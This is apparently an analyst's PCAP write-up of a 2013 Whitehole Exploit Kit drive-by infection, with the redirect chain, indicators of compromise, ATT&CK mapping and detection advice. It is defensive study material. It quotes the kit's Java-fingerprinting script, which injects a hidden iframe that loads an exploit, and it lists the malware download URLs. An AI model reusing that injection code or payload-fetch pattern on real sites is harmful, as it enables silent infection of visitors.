# pcap-phishing-analysis

# PCAP Analysis #1 — Whitehole Exploit Kit Drive-by

**Analyst:** [Chris]
**Date analyzed:** [10/13/26]
**PCAP source:** malware-traffic-analysis.net (2013-12-09)
**Attack type:** Drive-by exploit kit (Java exploit)
**Malware delivered:** Exploit:Java/Wacole.A

---

## Executive summary

A Windows 7 victim browsed a compromised news site, was silently redirected through a 5-hop chain, and was infected by the Whitehole Exploit Kit. The kit fingerprinted the victim's Java installation, delivered a Java exploit (7e.jar), and cleaned up by redirecting the victim to a legitimate ad network (rightmedia.com). Windows Defender later identified the payload as Exploit:Java/Wacole.A (Severity: Severe).

---

## Victim profile

| Field | Value |
|---|---|
| Victim IP | 172.16.2.139 |
| Operating system | Windows 7 (from User-Agent: "Windows NT 6.1") |
| Browser | Internet Explorer 8 (from User-Agent: "MSIE 8.0") |
| User-Agent | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0) |

---

## Attack chain

### Hop 1 — Initial lure (Stream 0)

Victim -> Compromised news site (23.218.156.83)

GET /gnews.php?id=884107-mlb-jeff-francoeur-had-lasik-surgery HTTP/1.1
Referer: http://www.kff1.com/gnews.php?id=...

- Fake news article (clickbait)
- Server responded 200 OK with HTML
- Hidden redirect embedded in the HTML sent victim to the exploit kit

### Hop 2 — Exploit kit landing (Stream 2)

Victim -> Exploit kit server (88.198.0.59)

GET /web1.php HTTP/1.1

Response: HTTP/1.1 302 Moved Temporarily

Location: http://aa1386641701.ponytherabbit.biz/temp/support/30f29ae/?cmpid=333333

- Server: Apache/2.2.22 (Ubuntu)
- PHP: PHP/5.3.10-1ubuntu3.8
- This is where the exploit kit begins its work

### Hop 3 — Payload server (Stream 3)

Victim -> Payload server (217.23.15.220 / aa1386641701.ponytherabbit.biz)

The server returned HTML that fingerprinted the victim's browser:

<script src='/temp/support/dj.js'></script>
<script language="javascript" src="http://www.dana123.com/index.php?ref=mediaclickinc"></script>
<script type="text/javascript">
var str = deployJava.getJREs();
str=str.toString().replace(/\./g,'');
if (str.length >= 3) {
  document.write('<iframe src=http://aa1386641701.ponytherabbit.biz:80/temp/support/931b3/?java=333333></iframe>');
}
</script>

Code analysis:

1. deployJava.getJREs() - checks for installed Java versions
2. str.replace(...) - compresses version string
3. if (str.length >= 3) - tests whether Java is installed
4. iframe - silently loads the Java exploit if Java is present

Result: If the victim has Java, an invisible iframe loads the Java exploit.

### Hop 4 — Malware delivery (Stream 3, continued)

Attacker -> Victim

GET /temp/support/7e.jar?java=333333 HTTP/1.1
GET /temp/support/30f29ae/app.jnlp HTTP/1.1
GET /temp/333333.exe HTTP/1.1
GET /temp/min.exe HTTP/1.1

- 7e.jar - Java exploit payload
- app.jnlp - Java Web Start launcher
- 333333.exe - first malware executable
- min.exe - second malware executable

### Hop 5 — Cleanup redirect (Stream 6)

Victim -> Ad network (108.168.246.235)

GET / HTTP/1.1
Referer: http://aa1386641701.ponytherabbit.biz/temp/support/30f29ae/?cmpid=333333
Host: www.rightmedia.com

Response: HTTP/1.1 302 Found -> https://www.rightmedia.com/

- Attackers redirect victim to a legitimate ad network
- Makes browser history look innocent
- Victim never knows they were attacked

---

## Malware identification

File: 7e.jar
Defender detection: Exploit:Java/Wacole.A
Severity: Severe
Internal class file: TestByteBl.class

Wacole family:
- A Java exploit family active 2012-2013
- Exploits CVE-2013-2465 (Java Runtime Environment)
- Allows Remote Code Execution
- Distributed via multiple exploit kits (Whitehole, Blackhole, Sweet Orange)

---

## Indicators of Compromise (IOCs)

### IPs

| IP | Role |
|---|---|
| 172.16.2.139 | Victim |
| 23.218.156.83 | Compromised news site |
| 88.198.0.59 | Exploit kit landing |
| 217.23.15.220 | Payload server |
| 50.22.134.3 | Ad network redirect |
| 108.168.246.235 | Cleanup redirect host |

### Domains

| Domain | Purpose |
|---|---|
| www.kff1.com | Compromised news site |
| aa1386641701.ponytherabbit.biz | Malicious redirect / payload delivery |
| www.dana123.com | Additional ad script |
| www.rightmedia.com | Legitimate ad network (used as cover) |

### URLs

/gnews.php?id=884107-mlb-jeff-francoeur-had-lasik-surgery
/web1.php
/temp/support/30f29ae/?cmpid=333333
/temp/support/dj.js
/temp/support/931b3/?java=333333
/temp/support/7e.jar?java=333333
/temp/support/30f29ae/app.jnlp
/temp/333333.exe
/temp/min.exe
/index.php?ref=mediaclickinc

### Files

| Filename | Size | Type |
|---|---|---|
| 7e.jar | 8069 B | Java exploit payload |
| app.jnlp | 75 B | Java Web Start launcher |
| dj.js | 15 KB | JavaScript fingerprinting |
| 333333.exe | (streamed) | Malware dropper |
| min.exe | (streamed) | Second malware |

### Campaign identifiers

- cmpid=333333 - exploit kit campaign ID
- ?java=333333 - Java-present marker

### Server fingerprints

- Apache/2.2.22 (Ubuntu) - exploit kit landing server
- PHP/5.3.10-1ubuntu3.8 - PHP version
- nginx/1.2.1 - payload server
- PHP/5.3.3-7+squeeze17 - payload server PHP (Debian 6 squeeze)

---

## MITRE ATT&CK mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1189 - Drive-by Compromise | Hidden iframe redirect |
| Execution | T1203 - Exploitation for Client Execution | Java exploit (Wacole) |
| Execution | T1204.002 - User Execution: Malicious File | 7e.jar download |
| Command & Control | T1071.001 - Application Layer Protocol: Web | HTTP callbacks |
| Ingress Tool Transfer | T1105 - Ingress Tool Transfer | Multiple malware downloads |
| Defense Evasion | T1036 - Masquerading | Redirect to rightmedia.com |

---

## Detection recommendations

### Network (Suricata / firewall)

- Alert on any HTTP request containing cmpid=333333 (campaign signature)
- Alert on User-Agent with MSIE 8.0 + Windows NT 6.1 making requests to suspicious IPs
- Alert on redirects to .biz domains from HTTP 302 responses
- Block DNS for ponytherabbit.biz and similar fast-flux domains

### Endpoint (EDR / Defender)

- Alert on Java Web Start (javaws.exe) launching .jnlp files from external URLs
- Alert on files named TestByteBl.class or any .class files in Java cache
- Alert on 333333.exe or min.exe creation
- Alert on outgoing connections to 217.23.15.220 or 50.22.134.3

### Browser

- Disable Java browser plugins in enterprise
- Block known exploit kit domains at the proxy

---

## Lessons learned

1. Redirect chains hide the attack. The victim's browser visited 5 different IPs in under a minute. Only one of them was obviously malicious.

2. Cleanup redirects look innocent. rightmedia.com is a legitimate ad network. If a SOC analyst only checked the final destination, they would have missed the attack.

3. Java is a powerful attack vector. The kit's only fingerprint was if (str.length >= 3) - a 4-character check that decides whether to fire the exploit.

4. Multi-variant delivery. The kit repeatedly requested 7e.jar (4 times) and app.jnlp (3 times) - trying different exploit combinations until one worked.

5. The User-Agent is a goldmine. From one string, we identified:
   - OS (Windows 7 / NT 6.1)
   - Browser (Internet Explorer 8)
   - Architecture (WOW64 = 64-bit)
   - Installed .NET versions

6. The campaign ID persists. cmpid=333333 appeared in 5 different streams - the attacker's tracking identifier tied the whole attack together.

---

## Screenshots

- [X] Attack overview (Packet list with http filter)
- [X] Stream 0 - Initial fake news page
- [X] Stream 2 - Exploit kit redirect (/web1.php)
- [X] Stream 3 - Exploit HTML + Java fingerprinting code
- [X] Stream 6 - Cleanup redirect (rightmedia.com)
- [X] Export Objects list showing extracted files
- [X] Windows Defender quarantine (Exploit:Java/Wacole.A)

---

## References

- Whitehole Exploit Kit overview: malware-traffic-analysis.net (2013-12-09)
- CVE-2013-2465 (Java RCE): https://nvd.nist.gov/vuln/detail/CVE-2013-2465
- MITRE ATT&CK T1189 - Drive-by Compromise
- Microsoft Threat Encyclopedia - Exploit:Java/Wacole.A
